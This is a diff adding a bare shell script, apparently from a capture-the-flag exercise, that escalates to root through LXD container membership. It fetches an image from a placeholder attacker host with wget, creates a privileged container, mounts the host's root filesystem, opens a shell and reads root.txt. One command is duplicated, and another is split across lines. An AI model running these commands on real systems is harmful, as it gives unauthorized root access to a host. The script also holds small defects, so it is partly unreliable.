@@ -1,0 +1,18 @@
+cd /tmp
+wget http://<attacker_ip>/alpine-3-7-apache-php5-6.tar.bz2
+
+lxc image import ./alpine-3-7-apache-php5-6.tar.bz2 --alias myimage
+
+lxc image list
+
+lxc init myimage ignite -c security.privileged=true
+
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+
+lxc config device add ignite mystorage disk source=/ path=/mnt/root
+recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+cd /mnt/root/root
+cat root.txt
